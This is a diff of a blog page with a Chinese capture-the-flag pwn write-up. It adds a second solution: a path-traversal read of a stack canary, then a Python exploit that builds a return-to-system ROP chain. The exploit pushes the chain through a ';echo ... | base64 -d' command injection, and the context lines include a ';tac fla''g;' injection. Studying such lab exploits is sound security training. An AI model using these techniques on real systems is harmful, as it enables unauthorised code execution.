@@ -1912,7 +1912,52 @@ plaintext <span class="token operator">=</span> aes<span class="token punctuatio
 <p>;tac fla’’g;</p>
 </blockquote>
 <p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310272057437.png" alt="image-20231021182601723"></p>
-<p>还有一种解法是</p>
+<p>还有一种解法是栈溢出</p>
+<p>catCommand中strcat的第二个参数s没有ban掉”..”，所以存在目录穿越能够读前面init函数中的canary文件</p>
+<p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202402041714346.png" alt="yhKJ12TU1sfxJbU3e4J4fbAKeqwQuVTxDapfrLcNOvo"></p>
+<p>gets是把v1这个fd对应的文件中的数据读到栈上，读0x200大小，但其实v11这个数组只有120大小，所以就可能存在溢出</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Excalibur <span class="token keyword">import</span><span class="token operator">*</span>
+<span class="token keyword">import</span> base64
+
+contextset<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#remo('node4.buuoj.cn',25365)</span>
+proc<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
+
+sla<span class="token punctuation">(</span>b<span class="token string">'name:'</span><span class="token punctuation">,</span>b<span class="token string">'a\n'</span><span class="token punctuation">)</span>
+sla<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token punctuation">,</span>b<span class="token string">'CAT'</span><span class="token punctuation">)</span>
+sla<span class="token punctuation">(</span>b<span class="token string">'view:'</span><span class="token punctuation">,</span>b<span class="token string">'../secret/canary.txt'</span><span class="token punctuation">)</span>
+rc<span class="token punctuation">(</span><span class="token punctuation">)</span>
+canary <span class="token operator">=</span> <span class="token punctuation">(</span>ru<span class="token punctuation">(</span>b<span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+canary <span class="token operator">=</span> int<span class="token punctuation">(</span>canary<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+prh<span class="token punctuation">(</span>canary<span class="token punctuation">)</span>
+
+pop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000401ce3</span>
+binsh <span class="token operator">=</span> <span class="token number">0x0000000000402090</span>
+ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>
+system <span class="token operator">=</span> <span class="token number">0x00000000004018B2</span>
+
+
+sla<span class="token punctuation">(</span>b<span class="token string">'$'</span><span class="token punctuation">,</span>b<span class="token string">'PING'</span><span class="token punctuation">)</span>
+pay <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
+
+pay <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
+
+py <span class="token operator">=</span> b<span class="token string">";echo "</span><span class="token operator">+</span>b<span class="token string">'"'</span>
+py <span class="token operator">+=</span> pay
+py <span class="token operator">+=</span> b<span class="token string">'" | base64 -d'</span>
+
+sla<span class="token punctuation">(</span>b<span class="token string">"address"</span><span class="token punctuation">,</span>py<span class="token punctuation">)</span>
+
+sla<span class="token punctuation">(</span>b<span class="token string">'$'</span><span class="token punctuation">,</span>b<span class="token string">"CAT"</span><span class="token punctuation">)</span>
+
+sla<span class="token punctuation">(</span>b<span class="token string">"view"</span><span class="token punctuation">,</span><span class="token string">"result.txt"</span><span class="token punctuation">)</span>
+
+
+ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+</code></pre>
 <h2 id="GuestBook"><a href="#GuestBook" class="headerlink" title="GuestBook"></a>GuestBook</h2><p>输入name的时候有溢出，可以覆盖一个字节泄露canary，</p>
 <p>接着在strcpy中有溢出，直接传payload，被strcpy遇b’\x00’截断这个问题卡住了（遇零截断意味着无法传输字符\x00，然而canary以\x00结尾）</p>
 <p>调试解决发现在  __isoc99_scanf(“%s”, message);输入字符串的时候会在后面补零</p>
